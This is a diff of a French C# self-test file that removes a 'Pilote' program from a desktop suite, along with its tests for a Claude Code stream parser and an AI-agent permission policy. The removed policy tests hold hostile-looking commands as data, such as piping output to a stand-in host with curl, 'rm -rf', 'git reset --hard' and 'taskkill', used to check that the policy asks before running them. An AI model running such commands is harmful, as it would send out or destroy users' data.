@@ -206,7 +206,7 @@ static class SelfTest
         try
         {
             var s = new PinStore(file);
-            Check("fichier absent : 16 épingles par défaut (dont Notes, Terminal CDX, Agenda, Courrier, Pilote, YouTube et Audio Linker), 5 dans la barre", s.Items.Count == 16 && s.OnBar.Count == 5 && s.Items.All(p => p.Tile));
+            Check("fichier absent : 15 épingles par défaut (dont Notes, Terminal CDX, Agenda, Courrier, YouTube et Audio Linker), 5 dans la barre", s.Items.Count == 15 && s.OnBar.Count == 5 && s.Items.All(p => p.Tile));
             Check("la barre commence par l'Explorateur et finit par le Navigateur CDX", s.OnBar[0].Target == "cdx:explorer" && s.OnBar[^1].Target == "cdx:navigateur");
 
             Check("ajout d'un fichier existant", s.AddToBar("Essai", exe) && s.OnBar.Count == 6 && s.OnBar[^1].Target == exe);
@@ -257,9 +257,9 @@ static class SelfTest
 
             File.WriteAllText(file, "{{{ abîmé");
             var s3 = new PinStore(file);
-            Check("fichier abîmé : valeurs par défaut, aucune exception", s3.Items.Count == 16 && s3.OnBar.Count == 5);
+            Check("fichier abîmé : valeurs par défaut, aucune exception", s3.Items.Count == PinStore.Defaults.Length && s3.OnBar.Count == 5);
             File.WriteAllText(file, "{\"version\":2,\"pins\":[]}");
-            Check("version inconnue : valeurs par défaut", new PinStore(file).Items.Count == 16);
+            Check("version inconnue : valeurs par défaut", new PinStore(file).Items.Count == PinStore.Defaults.Length);
             string allSeen = "\"seen\":[" + string.Join(",", PinStore.Defaults.Select(d => "\"" + d.Target + "\"")) + "],";   // toutes les épingles par défaut déjà proposées : rien à ajouter
             File.WriteAllText(file, "{\"version\":1," + allSeen + "\"pins\":[{\"name\":\"Bon\",\"target\":\"cdx:repos\",\"bar\":true,\"tile\":false},{\"name\":\"Mauvais\",\"target\":\"C:\\\\nexiste\\\\pas.exe\",\"bar\":true},{\"name\":\"Doublon\",\"target\":\"CDX:REPOS\",\"bar\":true},{\"name\":\"Rien\",\"target\":\"cdx:explorer\"},42]}");
             var s4 = new PinStore(file);
@@ -271,8 +271,10 @@ static class SelfTest
             string legacy = Path.Combine(dir, "ancien.json");
             File.WriteAllText(legacy, "{\"version\":1,\"pins\":[{\"name\":\"Explorateur\",\"target\":\"cdx:explorer\",\"ic\":\"dossier\",\"bar\":true,\"tile\":true,\"barIndex\":0},{\"name\":\"Calculatrice\",\"target\":\"calc.exe\",\"ic\":\"apps\",\"bar\":false,\"tile\":true,\"barIndex\":-1}]}");
             var lg = new PinStore(legacy);
-            Check("ancien fichier (sans « seen ») : seules les tuiles Notes, Terminal CDX, Agenda, Courrier, Pilote, YouTube et Audio Linker sont ajoutées (hors barre), les neuf d'origine ne reviennent pas", lg.Items.Select(p => p.Target).SequenceEqual(new[] { "cdx:explorer", "calc.exe", "cdx:notes", "cdx:terminal", "cdx:agenda", "cdx:courrier", "cdx:pilote", "cdx:youtube", "cdx:audio_linker" }) && lg.Find("cdx:notes") is { Tile: true, Bar: false } && lg.Find("cdx:terminal") is { Tile: true, Bar: false } && lg.OnBar.Count == 1);
-            Check("la migration est écrite : « seen » contient cdx:notes, une relecture ne la refait pas", File.ReadAllText(legacy).Contains("\"seen\"") && File.ReadAllText(legacy).Contains("cdx:notes") && File.ReadAllText(legacy).Contains("cdx:terminal") && File.ReadAllText(legacy).Contains("cdx:agenda") && File.ReadAllText(legacy).Contains("cdx:courrier") && File.ReadAllText(legacy).Contains("cdx:pilote") && File.ReadAllText(legacy).Contains("cdx:youtube") && File.ReadAllText(legacy).Contains("cdx:audio_linker") && new PinStore(legacy).Items.Count == 9);
+            Check("ancien fichier (sans « seen ») : seules les tuiles Notes, Terminal CDX, Agenda, Courrier, YouTube et Audio Linker sont ajoutées (hors barre), les neuf d'origine ne reviennent pas", lg.Items.Select(p => p.Target).SequenceEqual(new[] { "cdx:explorer", "calc.exe", "cdx:notes", "cdx:terminal", "cdx:agenda", "cdx:courrier", "cdx:youtube", "cdx:audio_linker" }) && lg.Find("cdx:notes") is { Tile: true, Bar: false } && lg.Find("cdx:terminal") is { Tile: true, Bar: false } && lg.OnBar.Count == 1);
+            Check("la migration est écrite : « seen » contient cdx:notes, une relecture ne la refait pas", File.ReadAllText(legacy).Contains("\"seen\"") && File.ReadAllText(legacy).Contains("cdx:notes") && File.ReadAllText(legacy).Contains("cdx:terminal") && File.ReadAllText(legacy).Contains("cdx:agenda") && File.ReadAllText(legacy).Contains("cdx:courrier") && File.ReadAllText(legacy).Contains("cdx:youtube") && File.ReadAllText(legacy).Contains("cdx:audio_linker") && new PinStore(legacy).Items.Count == 8);
+            File.WriteAllText(legacy, "{\"version\":1," + allSeen + "\"pins\":[{\"name\":\"Pilote\",\"target\":\"cdx:pilote\",\"bar\":true,\"tile\":true},{\"name\":\"Explorateur\",\"target\":\"cdx:explorer\",\"bar\":true,\"tile\":true}]}");
+            Check("un programme retiré de la suite (Pilote) : sa tuile et son épingle disparaissent, le reste demeure", new PinStore(legacy) is var rp && rp.Find("cdx:pilote") == null && rp.Find("cdx:explorer") != null);
             File.WriteAllText(legacy, "{\"version\":1," + allSeen + "\"pins\":[{\"name\":\"Explorateur\",\"target\":\"cdx:explorer\",\"bar\":true,\"tile\":true,\"barIndex\":0}]}");
             Check("tuile Notes retirée par l'utilisateur (déjà dans « seen ») : elle ne revient pas", new PinStore(legacy).Items.Count == 1);
             File.WriteAllText(legacy, "{\"version\":1," + allSeen + "\"pins\":[{\"name\":\"Explorateur\",\"target\":\"cdx:explorer\",\"ic\":\"dossier\",\"bar\":true,\"tile\":true},{\"name\":\"Notes\",\"target\":\"cdx:notes\",\"ic\":\"carnet\",\"bar\":false,\"tile\":true},{\"name\":\"Chrome\",\"target\":\"chrome.exe\",\"ic\":\"serveur\",\"bar\":true,\"tile\":true}]}");
@@ -611,84 +613,6 @@ static class SelfTest
         try { File.Delete(perso); } catch (Exception) { }
         lines.Add(bad == 0 ? "TOUT EST BON" : $"{bad} vérification(s) en échec");
         File.WriteAllLines(Path.Combine(Host.DataDir, "selftest-spell.txt"), lines);
-        Environment.ExitCode = bad == 0 ? 0 : 1;
-    }
-
-    // cdx-shell.exe --selftest-pilote : l'analyseur du flux de Claude Code (Cdx.Host/ClaudeFlux.cs) sur des lignes RELEVÉES en vrai le 01/11/2026 (Claude Code 2.1.316,
-    // sonde en stream-json avec --permission-prompt-tool stdio), et la politique d'autorisation de Pilote (PilotPolicy.cs). Logique pure, aucun processus lancé.
-    public static void RunPilot()
-    {
-        var lines = new List<string>(); int bad = 0;
-        void Check(string what, bool ok) { lines.Add((ok ? "OK     " : "ÉCHEC  ") + what); if (!ok) bad++; }
-        try
-        {
-            var f = new ClaudeFlux();
-            var init = f.Line("""{"type":"system","subtype":"init","cwd":"C:\\Dev","session_id":"5e7baf9f-3aa3-41ed-b711-2bbf7c26dfb7","tools":["Bash","Read"],"mcp_servers":[{"name":"cdx-suite","status":"connected"}],"model":"claude-fable-5-1","permissionMode":"default","uuid":"x"}""");
-            Check("system/init : session, modèle, serveurs MCP", init.Count == 1 && init[0].Kind == "init" && init[0].SessionId == "5e7baf9f-3aa3-41ed-b711-2bbf7c26dfb7" && init[0].Text == "claude-fable-5-1" && init[0].Mcp == "cdx-suite:connected");
-            Check("ligne illisible ou inconnue : rien", f.Line("pas du json").Count == 0 && f.Line("""{"type":"system","subtype":"hook_started"}""").Count == 0);
-            Check("system/status : requesting", f.Line("""{"type":"system","subtype":"status","status":"requesting","session_id":"s","uuid":"u"}""") is { Count: 1 } st && st[0].Kind == "status" && st[0].Text == "requesting");
-            f.Line("""{"type":"stream_event","event":{"type":"message_start","message":{"id":"msg_011CgcU3SS8gMqkB9Da5ZAbH","type":"message","role":"assistant","content":[]}},"session_id":"s","uuid":"u"}""");
-            var d1 = f.Line("""{"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"Je crée "}},"session_id":"s","uuid":"u"}""");
-            var d2 = f.Line("""{"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"text_delta","text":"le fichier."}},"session_id":"s","uuid":"u"}""");
-            Check("text_delta : le texte au fil de l'eau", d1.Count == 1 && d1[0].Kind == "text" && d1[0].Text == "Je crée " && d2[0].Text == "le fichier.");
-            var th = f.Line("""{"type":"stream_event","event":{"type":"content_block_delta","index":0,"delta":{"type":"thinking_delta","thinking":"hum"}},"session_id":"s","uuid":"u"}""");
-            Check("thinking_delta : signalé", th.Count == 1 && th[0].Kind == "thinking");
-            var a1 = f.Line("""{"type":"assistant","message":{"model":"claude-fable-5-1","id":"msg_011CgcU3SS8gMqkB9Da5ZAbH","type":"message","role":"assistant","content":[{"type":"text","text":"Je crée le fichier."}],"stop_reason":null},"parent_tool_use_id":null,"session_id":"s","uuid":"u"}""");
-            Check("message assistant dont le texte est déjà arrivé en morceaux : pas de doublon", a1.Count == 0);
-            var a2 = f.Line("""{"type":"assistant","message":{"model":"claude-fable-5-1","id":"msg_011CgcU3SS8gMqkB9Da5ZAbH","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01VmAK83ekoCfCmTdKDNRXb5","name":"Write","input":{"file_path":"C:\\Dev\\sonde_test.txt","content":"ok"},"caller":{"type":"direct"}}],"stop_reason":null},"parent_tool_use_id":null,"session_id":"s","uuid":"u"}""");
-            Check("bloc tool_use : outil, identifiant, cible (le chemin), arguments", a2.Count == 1 && a2[0].Kind == "tool" && a2[0].ToolName == "Write" && a2[0].ToolId == "toolu_01VmAK83ekoCfCmTdKDNRXb5" && a2[0].Target == "C:\\Dev\\sonde_test.txt" && a2[0].Input.Contains("\"content\":\"ok\""));
-            Check("le même bloc tool_use renvoyé : ignoré", f.Line("""{"type":"assistant","message":{"id":"msg_011CgcU3SS8gMqkB9Da5ZAbH","role":"assistant","content":[{"type":"tool_use","id":"toolu_01VmAK83ekoCfCmTdKDNRXb5","name":"Write","input":{"file_path":"C:\\Dev\\sonde_test.txt","content":"ok"}}]},"parent_tool_use_id":null,"session_id":"s","uuid":"u"}""").Count == 0);
-            var perm = f.Line("""{"type":"control_request","request_id":"d8a44bfd-d948-411c-a0f2-31fd94fd62fb","request":{"subtype":"can_use_tool","tool_name":"Write","display_name":"Write","input":{"file_path":"C:\\Dev\\sonde_test.txt","content":"ok"},"description":"sonde_test.txt","permission_suggestions":[{"type":"setMode","mode":"acceptEdits","destination":"session"}],"tool_use_id":"toolu_01VmAK83ekoCfCmTdKDNRXb5"}}""");
-            Check("control_request can_use_tool : demande d'accord (identifiant, outil, arguments, cible)", perm.Count == 1 && perm[0].Kind == "permission" && perm[0].RequestId == "d8a44bfd-d948-411c-a0f2-31fd94fd62fb" && perm[0].ToolName == "Write" && perm[0].Input.Contains("sonde_test.txt") && perm[0].Target == "C:\\Dev\\sonde_test.txt" && perm[0].ToolUseId == "toolu_01VmAK83ekoCfCmTdKDNRXb5" && perm[0].Suggestions.Contains("acceptEdits"));
-            Check("control_request d'un autre sous-type : rien", f.Line("""{"type":"control_request","request_id":"r","request":{"subtype":"hook_callback"}}""").Count == 0);
-            var res = f.Line("""{"type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01VmAK83ekoCfCmTdKDNRXb5","type":"tool_result","content":"File created successfully at: C:\\Dev\\sonde_test.txt"}]},"parent_tool_use_id":null,"session_id":"s","uuid":"u","tool_use_result":{"type":"create"}}""");
-            Check("tool_result : résultat lié à l'outil", res.Count == 1 && res[0].Kind == "result_tool" && res[0].ToolId == "toolu_01VmAK83ekoCfCmTdKDNRXb5" && res[0].Text.StartsWith("File created") && !res[0].IsError);
-            var rese = f.Line("""{"type":"user","message":{"role":"user","content":[{"tool_use_id":"t2","type":"tool_result","content":[{"type":"text","text":"boum"}],"is_error":true}]},"session_id":"s","uuid":"u"}""");
-            Check("tool_result en erreur, contenu en liste", rese.Count == 1 && rese[0].IsError && rese[0].Text == "boum");
-            var a3 = f.Line("""{"type":"assistant","message":{"id":"msg_autre","role":"assistant","content":[{"type":"text","text":"C'est fait."}]},"parent_tool_use_id":null,"session_id":"s","uuid":"u"}""");
-            Check("message assistant sans morceaux reçus : texte rendu entier", a3.Count == 1 && a3[0].Kind == "text" && a3[0].Text == "C'est fait.");
-            var sub = f.Line("""{"type":"assistant","message":{"id":"msg_sub","role":"assistant","content":[{"type":"text","text":"(sous-agent)"},{"type":"tool_use","id":"t9","name":"Read","input":{"file_path":"a.txt"}}]},"parent_tool_use_id":"toolu_parent","session_id":"s","uuid":"u"}""");
-            Check("sous-agent : ses outils, pas son texte", sub.Count == 1 && sub[0].Kind == "tool" && sub[0].ToolName == "Read");
-            var q = f.Line("""{"type":"rate_limit_event","rate_limit_info":{"status":"allowed","unifiedWindows":{"five_hour":{"utilization":0.42,"resetsAt":1762000000},"seven_day":{"utilization":0.1,"resetsAt":1762500000}}},"session_id":"s","uuid":"u"}""");
-            Check("rate_limit_event : quota des 5 h et des 7 jours", q.Count == 1 && q[0].Kind == "quota" && Math.Abs(q[0].Part - 0.42) < 1e-9 && q[0].ResetsAt == 1762000000 && Math.Abs(q[0].SevenPart - 0.1) < 1e-9);
-            var r = f.Line("""{"type":"result","subtype":"success","is_error":false,"duration_ms":6100,"duration_api_ms":5381,"num_turns":3,"result":"C'est fait : le fichier est créé.","stop_reason":"end_turn","session_id":"5e7baf9f","total_cost_usd":0.21994899999999998,"usage":{"input_tokens":34,"cache_creation_input_tokens":9813,"cache_read_input_tokens":53196,"output_tokens":201,"iterations":[{"input_tokens":2,"output_tokens":42,"cache_read_input_tokens":21836,"cache_creation_input_tokens":9524},{"input_tokens":32,"output_tokens":42,"cache_read_input_tokens":31360,"cache_creation_input_tokens":289}]},"modelUsage":{"claude-fable-5-1":{"inputTokens":34,"outputTokens":201,"cacheReadInputTokens":53196,"cacheCreationInputTokens":9813,"contextWindow":1000000}},"permission_denials":[],"uuid":"u"}""");
-            Check("result : texte, coût, jetons, durée, contexte du dernier appel sur la fenêtre du modèle", r.Count == 1 && r[0].Kind == "result" && r[0].Text.StartsWith("C'est fait") && Math.Abs(r[0].CostUsd - 0.219949) < 1e-6 && r[0].DurationMs == 6100 && r[0].InputTokens == 34 + 9813 + 53196 && r[0].OutputTokens == 201 && r[0].ContextUsed == 32 + 31360 + 289 && r[0].ContextMax == 1000000 && !r[0].IsError && r[0].Subtype == "success");
-            var rerr = f.Line("""{"type":"result","subtype":"error_during_execution","is_error":true,"result":"No conversation found with session ID: x","session_id":"x","usage":{}}""");
-            Check("result en erreur : signalé avec son sous-type", rerr.Count == 1 && rerr[0].IsError && rerr[0].Subtype == "error_during_execution" && rerr[0].Text.Contains("No conversation found"));
-
-            string um = ClaudeFlux.UserMessage("Bonjour \"toi\"");
-            Check("message utilisateur : la forme attendue sur l'entrée", um.Contains("\"type\":\"user\"") && um.Contains("\"role\":\"user\"") && um.Contains("\"type\":\"text\"") && um.Contains("Bonjour \\\"toi\\\""));
-            string ok = ClaudeFlux.Answer("d8a4", true, "{\"file_path\":\"C:\\\\Dev\\\\a.txt\"}", null), no = ClaudeFlux.Answer("d8a4", false, null, "Non.");
-            Check("réponse d'accord : control_response success avec allow et updatedInput", ok.Contains("\"type\":\"control_response\"") && ok.Contains("\"subtype\":\"success\"") && ok.Contains("\"request_id\":\"d8a4\"") && ok.Contains("\"behavior\":\"allow\"") && ok.Contains("\"updatedInput\":{\"file_path\":"));
-            Check("réponse de refus : deny avec le message", no.Contains("\"behavior\":\"deny\"") && no.Contains("\"message\":\"Non.\"") && !no.Contains("updatedInput"));
-            Check("interruption : control_request interrupt", ClaudeFlux.Interrupt("i1").Contains("\"subtype\":\"interrupt\"") && ClaudeFlux.Interrupt("i1").Contains("\"request_id\":\"i1\""));
-            using (var jd = System.Text.Json.JsonDocument.Parse("""{"command":"git status\nls","description":"État"}"""))
-                Check("cible d'un outil : première ligne, bornée", ClaudeFlux.TargetOf("Bash", jd.RootElement) == "git status");
-
-            // ---- la politique ----
-            var roots = new[] { @"C:\Essai\Dev", @"C:\Essai\Notes CDX" };
-            System.Text.Json.JsonElement J(string s) { using var d = System.Text.Json.JsonDocument.Parse(s); return d.RootElement.Clone(); }
-            var A = PilotPolicy.Decision.Allow; var K = PilotPolicy.Decision.Ask;
-            Check("lecture (Read, Grep, outils MCP de lecture) : permise à tous les niveaux", PilotPolicy.Levels.All(l => PilotPolicy.Decide("Read", J("""{"file_path":"C:\\Windows\\x"}"""), roots, l) == A && PilotPolicy.Decide("mcp__cdx-notes__notes_read", J("{}"), roots, l) == A && PilotPolicy.Decide("mcp__cdx-suite__browser_read", J("{}"), roots, l) == A));
-            Check("écriture dans un dossier de travail : libre / prudent demande / auto", PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\Dev\\Zeta\\README.md"}"""), roots, "libre") == A && PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\Dev\\Zeta\\README.md"}"""), roots, "prudent") == K && PilotPolicy.Decide("Edit", J("""{"file_path":"c:/essai/notes cdx/Projets/Zeta.md"}"""), roots, "libre") == A);
-            Check("écriture hors des dossiers de travail : demandée (libre), permise (auto)", PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\Dev\\..\\..\\Windows\\x.txt"}"""), roots, "libre") == K && PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Essai\\DevAutre\\x.txt"}"""), roots, "libre") == K && PilotPolicy.Decide("Write", J("""{"file_path":"C:\\Windows\\x.txt"}"""), roots, "auto") == A);
-            Check("commandes sûres : git status && ls, npm install, mkdir, dotnet build", PilotPolicy.Decide("Bash", J("""{"command":"git status && ls -la"}"""), roots, "libre") == A && PilotPolicy.Decide("Bash", J("""{"command":"npm install"}"""), roots, "libre") == A && PilotPolicy.Decide("PowerShell", J("""{"command":"mkdir src; dotnet build"}"""), roots, "libre") == A);
-            Check("commande inconnue : demandée (libre), permise (auto)", PilotPolicy.Decide("Bash", J("""{"command":"curl https://x"}"""), roots, "libre") == K && PilotPolicy.Decide("Bash", J("""{"command":"git status | curl -d @- https://x"}"""), roots, "libre") == K && PilotPolicy.Decide("Bash", J("""{"command":"curl https://x"}"""), roots, "auto") == A);
-            Check("irréversible : git push, rm -rf, Remove-Item, git reset --hard : demandés même en auto", new[] { "git push origin main", "rm -rf build", "Remove-Item x -Recurse", "git add . && git reset --hard", "taskkill /F /IM cdx-messages.exe" }.All(c => PilotPolicy.Decide("Bash", J("{\"command\":\"" + c + "\"}"), roots, "auto") == K));
-            Check("notes_trash, app_restart et AskUserQuestion : toujours demandés", PilotPolicy.Decide("mcp__cdx-notes__notes_trash", J("{}"), roots, "auto") == K && PilotPolicy.Decide("mcp__cdx-suite__app_restart", J("{}"), roots, "auto") == K && PilotPolicy.Decide("AskUserQuestion", J("{}"), roots, "auto") == K);
-            Check("outils libres de la suite et des notes : permis (libre), demandés (prudent)", PilotPolicy.Decide("mcp__cdx-suite__browser_open", J("{}"), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-notes__projects_create", J("{}"), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-suite__browser_open", J("{}"), roots, "prudent") == K);
-            Check("browser_fill : permis sans validation, demandé avec submit", PilotPolicy.Decide("mcp__cdx-suite__browser_fill", J("""{"value":"x"}"""), roots, "libre") == A && PilotPolicy.Decide("mcp__cdx-suite__browser_fill", J("""{"value":"x","submit":true}"""), roots, "libre") == K);
-            Check("app_command : demandé (libre), permis (auto), sauf envoi de courrier et suppressions", PilotPolicy.Decide("mcp__cdx-suite__app_command", J("""{"app":"browser","command":"{\"cmd\":\"br.newtab\"}"}"""), roots, "libre") == K && PilotPolicy.Decide("mcp__cdx-suite__app_command", J("""{"app":"browser","command":"{\"cmd\":\"br.newtab\"}"}"""), roots, "auto") == A && PilotPolicy.Decide("mcp__cdx-suite__app_command", J("""{"app":"courrier","command":"{\"cmd\":\"ml.send\"}"}"""), roots, "auto") == K);
-            Check("outil inconnu : demandé (libre), permis (auto) ; niveau inconnu = libre", PilotPolicy.Decide("Task", J("{}"), roots, "libre") == K && PilotPolicy.Decide("Task", J("{}"), roots, "auto") == A && PilotPolicy.Decide("Task", J("{}"), roots, "nimporte") == K);
-            Check("Under : casse ignorée, « .. » résolu, préfixe de nom refusé", PilotPolicy.Under(@"c:\essai\dev\a\b.txt", roots) && !PilotPolicy.Under(@"C:\Essai\Dev\..\x.txt", roots) && !PilotPolicy.Under(@"C:\Essai\Dev2\x.txt", roots) && !PilotPolicy.Under("", roots) && PilotPolicy.Under(@"C:\Essai\Dev", roots));
-            var (t1, d1b) = PilotPolicy.Describe("mcp__cdx-suite__browser_open", J("""{"url":"https://example.org/"}"""));
-            var (t2, d2b) = PilotPolicy.Describe("Bash", J("""{"command":"git push","description":"Envoi"}"""));
-            Check("Describe : titre lisible et détail", t1 == "Suite · browser_open" && d1b == "url : https://example.org/" && t2 == "Bash" && d2b == "git push");
-            Check("les outils de lecture passent par --allowedTools (nom exact des serveurs MCP)", PilotPolicy.ReadTools.Contains("mcp__cdx-notes__vault_info") && PilotPolicy.ReadTools.Contains("mcp__cdx-suite__suite_state") && !PilotPolicy.ReadTools.Contains("Write"));
-        }
-        catch (Exception ex) { lines.Add("EXCEPTION " + ex); bad++; }
-        lines.Add(bad == 0 ? "TOUT EST BON" : $"{bad} vérification(s) en échec");
-        File.WriteAllLines(Path.Combine(Host.DataDir, "selftest-pilote.txt"), lines);
         Environment.ExitCode = bad == 0 ? 0 : 1;
     }
 }
